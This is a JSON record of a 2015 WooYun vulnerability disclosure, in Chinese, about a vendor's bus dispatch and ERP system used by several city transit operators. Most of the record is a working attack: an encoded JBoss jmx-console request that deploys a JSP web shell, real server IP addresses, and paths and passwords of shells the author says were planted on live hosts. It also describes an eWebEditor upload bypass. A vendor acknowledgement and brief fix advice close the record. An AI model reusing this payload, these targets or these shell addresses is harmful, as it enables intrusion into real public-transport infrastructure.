{"id": 31733, "wybug_id": "wooyun-2015-0113239", "wybug_title": "某公共交通系统通用型漏洞打包", "wybug_corp": "郑州天迈科技股份有限公司", "wybug_author": "茜茜公主", "wybug_date": "2015-05-13 15:28", "wybug_open_date": "2015-08-15 19:08", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-15：\t细节向公众公开  简要描述： 通用型任意文件上传（2处）无需登录，目录浏览 详细说明：  http://www.tiamaes.com/case/ddxt/\n\n案例比较不好找，\n开封市公交http://117.158.104.47:8000/right/loginPwd.jsphttp://117.158.104.47:8000/gps/loginPwd.jsp\n\n郑州公交http://218.29.211.2:8000/right/loginPwd.jsphttp://218.29.211.2:8000/oa/loginPwd.jsphttp://218.29.211.2:8000/rlzy/loginPwd.jsp\n\nhttp://221.178.242.61:8000/right/loginPwd.jsphttp://221.178.242.61:8000/oa/loginPwd.jsphttp://221.178.242.61:8000/money/loginPwd.jsp\n\nhttp://218.27.133.147:8000/gps/loginPwd.jsphttp://218.27.133.147:8000/right/loginPwd.jsp\n\nhttp://222.179.97.83:8000/right/loginPwd.jsphttp://222.179.97.83:8000/gps/loginPwd.jsp\n第一处问题原因是由于该套建站程序使用的中间件jboss未正确配置导致getshellhttp://*/jmx-consolehttp://117.158.104.47:8000/jmx-console\n\nhttp://218.29.211.2:8000/jmx-console\n\nhttp://221.178.242.61:8000/jmx-console\n\nhttp://218.27.133.147:8000/jmx-console\n\nhttp://222.179.97.83:8000/jmx-console\n\n目测受到影响的系统有GPS公交智能调度系统、公交ERP综合信息管理系统拿shell的过程比较简单，直接用\n/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=wooyun.war&argType=java.lang.String&&arg1=shell&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=%3c%25+if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b+%25%3e&argType=boolean&arg4=True\n以开封为例，\nhttp://117.158.104.47:8000/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=wooyun.war&argType=java.lang.String&&arg1=shell&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=%3c%25+if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b+%25%3e&argType=boolean&arg4=True\n执行前\n\n执行后\n\n小马地址：http://117.158.104.47:8000/wooyun/shell.jsp遗憾的是传上去的shell不能正常访问，之后又报空间不足的错误\n\n换一个站点http://218.27.133.147:8000尝试用重复的步骤上传war包，该站访问没有出现问题小马http://218.27.133.147:8000/wooyun/shell.jsp一句话http://218.27.133.147:8000/wooyun/wooyun.jsp(woo1yun)\n\n\n\n再试一个http://218.29.211.2:8000，执行前\n\n执行后\n\n小马能正常访问：http://218.29.211.2:8000/wooyun/she11.jsp\n\n以上是第一处上传点   漏洞证明：  第二处上传点问题出在该公司所使用的编辑器ewebeditorewebeditor路径是\nhttp://*/gps/sys/WebEditor/eWebEditor.jsphttp://*/oa/sys/WebEditor/eWebEditor.jsphttp://*/right/sys/WebEditor/eWebEditor.jsphttp://*/rlzy/sys/WebEditor/eWebEditor.jsp\n\n\n略微的对该套系统进行扫描，就会发现系统可目录浏览比如http://218.29.211.2:8000/oa/syshttp://117.158.104.47:8000/gps/syshttp://221.178.242.61:8000/money/syshttp://218.27.133.147:8000/right/sys利用编辑器上传jpg后再抓包改包即可\n\n一句话地址：http://218.27.133.147:8000/gps/sys/WebEditor/uploadfile/1431241097697.jsp密码：woo0yun\n\n可直接访问\n\n剩下你懂的其它几个网站传个jsp证明一下\n\nhttp://218.29.211.2:8000/oa/sys/WebEditor/uploadfile/1431241434780.jsp\n\n   修复方案：  正确配置jboss编辑器上传点控制权限，过滤后缀   版权声明：转载请注明来源 茜茜公主@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-05-17 19:07 厂商回复： 已经转由CNCERT下发给相应分中心，由其后续协调网站管理单位处置 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}